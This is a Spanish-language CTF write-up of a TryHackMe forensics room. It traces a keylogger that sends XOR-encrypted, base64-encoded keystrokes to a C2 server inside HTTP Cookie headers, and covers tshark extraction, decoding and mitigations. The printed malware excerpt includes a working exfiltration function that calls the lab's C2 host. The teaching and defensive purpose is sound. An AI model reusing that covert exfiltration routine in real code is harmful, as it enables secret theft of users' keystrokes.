# Writeup: TryHackMe — Hacker Holidays 2026: Packed Light

## Información
- **Plataforma:** TryHackMe
- **Evento:** Hacker Holidays 2026 — The Byte Lotus
- **Room:** Packed Light
- **Tema:** Forensics / Network / Covert Channel
- **Dificultad:** Easy
- **Fecha:** 2026-08-07

## Resumen ejecutivo

Room de forensics donde un malware en la máquina de un huésped envía
teclas capturadas (keylogger) a un servidor C2 a través de requests HTTP
periódicas. Los datos viajan ocultos en el header `Cookie`, codificados en
base64 y cifrados con XOR. Al extraer el malware del tráfico y decodificar
las cookies, se obtiene la flag.

## Conceptos clave

### Covert channel sobre HTTP

Un atacante puede usar tráfico HTTP aparentemente legítimo para exfiltrar
datos. En este caso, cada request GET a `/` en el puerto 8080 llevaba un
carácter de datos en el header `Cookie`.

### Keylogger con exfiltración por HTTP

El malware `updates.py` captura pulsaciones de teclado y, por cada tecla:

1. Convierte el carácter a bytes UTF-8.
2. Cifra con XOR usando una clave hardcodeada.
3. Codifica en base64.
4. Envía en un header `Cookie: hotel_sess_state=<base64>`.

### XOR con clave repetida

```python
def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
```

Si se conoce la clave, el descifrado es idéntico al cifrado.

## Pasos de la room

### 1. Analizar el PCAP

El archivo `traffic.pcapng` contenía requests regulares a:

```
http://byte-lotus-hotel.thm:8080/
```

con User-Agent `ByteLotusClient/1.1`.

### 2. Extraer objetos HTTP

Se encontró un archivo Python descargado:

```bash
tshark -r traffic.pcapng --export-objects http,http_objects
```

Archivo: `updates.py`

### 3. Analizar el malware

El código contenía:

```python
C2_URL = "http://byte-lotus-hotel.thm:8080/"

def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def sendltr(character):
    raw_bytes = character.encode('utf-8')
    encrypted = xor(raw_bytes, getkey().encode('utf-8'))
    b64_string = base64.b64encode(encrypted).decode('utf-8')
    headers = {
        "Cookie": f"hotel_sess_state={b64_string}"
    }
    requests.get(C2_URL, headers=headers, timeout=0.5)
```

### 4. Extraer cookies del tráfico

```bash
tshark -r traffic.pcapng -Y "http.request && tcp.dstport == 8080" \
  -T fields -e http.cookie
```

Se filtraron los valores de `hotel_sess_state`.

### 5. Decodificar

```python
import base64

key = b"H0t3lSt@ff0NlyK3epS3cr3t!"

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

for cookie in cookies:
    encrypted = base64.b64decode(cookie)
    char = xor(encrypted, key).decode('utf-8')
    print(char, end='')
```

## Errores comunes y lecciones

### Error: buscar datos en el body de las respuestas

Las respuestas eran HTML estático del sitio del hotel. Los datos
exfiltrados iban en los **requests**, no en las respuestas.

### Error: no notar el User-Agent sospechoso

`ByteLotusClient/1.1` era el indicador claro de que el tráfico no era
normal. El hint de @0xMia lo confirmaba.

### Error: no extraer archivos del PCAP

Si no extraemos `updates.py` con `--export-objects`, no descubrimos la
clave ni el algoritmo.

## Variantes y uso real

- **Exfiltración por DNS:** datos en subdominios.
- **Exfiltración por headers HTTP:** User-Agent, Cookie, Referer.
- **C2 con requests periódicas (beacons):** difíciles de detectar sin
  análisis de timing.
- **Steganografía en imágenes o tráfico web.**

## Mitigaciones

1. **Monitorizar tráfico saliente:** alertar por conexiones regulares a IPs
   o dominios sospechosos.
2. **Endpoint detection:** detectar keyloggers y procesos inusuales.
3. **Restringir salida a puertos no estándar:** por ejemplo, bloquear
   outbound 8080 si no es necesario.
4. **Inspeccionar headers HTTP:** un proxy puede detectar exfiltración por
   cookies grandes o repetitivas.
5. **Principio de mínimo privilegio:** los endpoints no deberían poder
   instalar software arbitrario.

## Herramientas usadas

- `tshark` para análisis de tráfico.
- `tshark --export-objects` para extraer archivos.
- `capinfos` para metadatos del PCAP.
- Python para decodificar base64 + XOR.

## Material de referencia

- TryHackMe Hacker Holidays 2026.
- Wireshark display filters.
- OWASP Top 10 2021 — A10 Server-Side Request Forgery (SSRF) y Data Exposure.

## Autoevaluación

1. ¿Qué es un covert channel en una red?
2. ¿Por qué el malware usó el header `Cookie` para exfiltrar datos?
3. ¿Cómo funciona el cifrado XOR con clave repetida?
4. ¿Por qué el cifrado XOR es reversible aplicando la misma operación?
5. Nombra dos formas de detectar beacons C2 en una red.
